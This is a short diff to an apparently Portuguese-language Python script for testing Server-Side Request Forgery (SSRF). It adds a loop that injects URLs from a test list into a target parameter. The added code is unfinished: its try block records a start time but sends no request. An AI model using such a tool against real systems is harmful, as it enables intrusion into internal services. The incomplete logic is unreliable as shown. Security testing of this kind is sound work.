@@ -18,3 +18,11 @@ test_endpoints = [
 ]
 
 print("[+] Testando Server-Side Request Forhery (SSRF)...")
+
+for url in test_endpoints:
+    payload = {TARGET_PARAMETER: url}
+    print(f"[*] Tentando injetar URL: {url}")
+    try:
+        start_time = time.time()
+    except requests.exceptions.RequestException as e:
+        print(f"[-] Erro ao injetar URL '{url}': {e}")
